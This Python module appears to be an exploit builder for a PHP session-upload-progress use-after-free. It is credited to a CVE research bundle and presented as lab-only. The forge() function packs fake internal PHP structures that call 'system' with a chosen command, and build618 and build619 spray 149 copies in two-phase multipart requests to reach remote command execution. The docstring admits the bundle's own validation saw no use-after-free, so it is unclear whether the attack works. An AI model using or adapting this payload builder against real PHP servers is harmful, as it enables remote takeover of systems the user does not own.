"""Multipart bodies adapted from the public php2shell research bundle.

Source: https://github.com/Zer061/CVE-2026-109618 (2026-10-21)
The bundle's own VALIDATION.md reports that no ASAN heap-use-after-free was
observed locally. This module only builds requests for an isolated lab.
"""

from __future__ import annotations

import struct

FILL = 5120
N149 = 149
BLOB = 288
FCI = 64
IS_STRING_EX = 0x106
IS_OBJECT_EX = 0x308
ZEND_INTERNAL = 1

BOUNDARY_618 = b"B7kQpoc618"
BOUNDARY_619 = b"B7kQpoc619"


def forge(call: int, cmd: bytes) -> bytes:
    rec = bytearray(BLOB)
    struct.pack_into("<Q", rec, 0, FCI)
    struct.pack_into("<Q", rec, 8, call)
    struct.pack_into("<I", rec, 16, IS_STRING_EX)
    struct.pack_into("<I", rec, 48, 1)
    struct.pack_into("<B", rec, 64, ZEND_INTERNAL)
    struct.pack_into("<Q", rec, 64 + 88, call)
    struct.pack_into("<I", rec, 160, IS_OBJECT_EX)
    payload = b"system\x00" + cmd + b"\x00"
    rec[200:200 + len(payload)] = payload[:80]
    return bytes(rec)


def part(boundary: bytes, name: str, body: bytes, filename: str | None = None) -> bytes:
    disposition = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disposition += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disposition.encode() + b"\r\n\r\n" + body


def build_trigger(sid: str, file_bytes: bytes = b"Z") -> bytes:
    boundary = b"----b"
    head = b"--" + boundary + b"\r\n"
    return (
        head
        + b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        + sid.encode()
        + b"\r\n"
        + head
        + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + b"x\r\n"
        + head
        + b'Content-Disposition: form-data; name="f"; filename="a"\r\n\r\n'
        + file_bytes
        + b"\r\n--"
        + boundary
        + b"--\r\n"
    )


def trigger_split_point(body: bytes) -> int:
    marker = b'filename="a"\r\n\r\n'
    return body.index(marker) + len(marker) + 1


def build618(sid: str, command: bytes, call: int = 0) -> tuple[bytes, bytes, dict]:
    boundary = BOUNDARY_618
    spray = forge(call, command)
    if boundary in spray:
        raise ValueError("forge collided with boundary")

    pre = b"".join(
        [
            part(boundary, "PHPSESSID", sid.encode()) + b"\r\n",
            part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n",
            part(boundary, "f", b"", filename="a") + b"\r\n",
        ]
    )
    phase1 = pre + b"A" * (FILL + 64)

    tail = b"B" * (FILL + 64) + b"\r\n"
    for _ in range(N149):
        tail += part(boundary, "t[]", spray) + b"\r\n"
    tail += part(boundary, "g", b"C" * 64, filename="b") + b"\r\n"
    tail += b"--" + boundary + b"--\r\n"

    meta = {
        "boundary": boundary.decode(),
        "phase1": len(phase1),
        "total": len(phase1) + len(tail),
        "n149": N149,
        "blob": len(spray),
        "call": hex(call),
        "variant": "618-stale-outer",
    }
    return phase1, tail, meta


def build619(sid: str, command: bytes, call: int = 0) -> tuple[bytes, bytes, dict]:
    boundary = BOUNDARY_619
    spray = forge(call, command)
    if boundary in spray:
        raise ValueError("forge collided with boundary")

    pre = b""
    pre += part(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
    pre += part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
    for _ in range(N149):
        pre += part(boundary, "t[]", spray) + b"\r\n"
    pre += part(boundary, "f", b"", filename="a") + b"\r\n"
    phase1 = pre + b"A" * (FILL + 64)

    tail = b"B" * (FILL + 64)
    tail += b"C" * (FILL + 64)
    tail += b"\r\n--" + boundary + b"--\r\n"

    meta = {
        "boundary": boundary.decode(),
        "phase1": len(phase1),
        "total": len(phase1) + len(tail),
        "n149": N149,
        "blob": len(spray),
        "call": hex(call),
        "variant": "619-stale-inner",
    }
    return phase1, tail, meta
